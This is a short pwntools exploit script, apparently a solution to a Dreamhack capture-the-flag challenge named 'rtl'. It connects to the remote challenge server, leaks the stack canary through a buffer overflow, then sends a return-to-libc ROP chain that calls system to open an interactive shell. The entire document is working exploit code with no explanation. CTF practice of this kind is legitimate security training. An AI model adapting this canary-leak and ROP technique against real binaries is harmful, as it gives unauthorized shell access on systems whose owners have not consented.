from pwn import *

#p = process('./rtl')
p = remote('host3.dreamhack.games', 23079)
e = ELF('./rtl')

cnry_leak_payload = b'A'*0x39

p.sendafter(b"Buf: ", cnry_leak_payload)

p.recvuntil(cnry_leak_payload)

cnry = p.recv(7)
cnry = u64(b'\x00' + cnry)

print(f"Canary: {p64(cnry)}")


bs_addr = 0x400874
sys_plt_addr = 0x4005d0
pop_rdi = 0x400853
ret = 0x400285

payload = b'A' * 0x38
payload += p64(cnry)
payload += b'A' *0x8
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bs_addr)
payload += p64(sys_plt_addr)

p.sendlineafter("Buf: ", payload)


p.interactive()
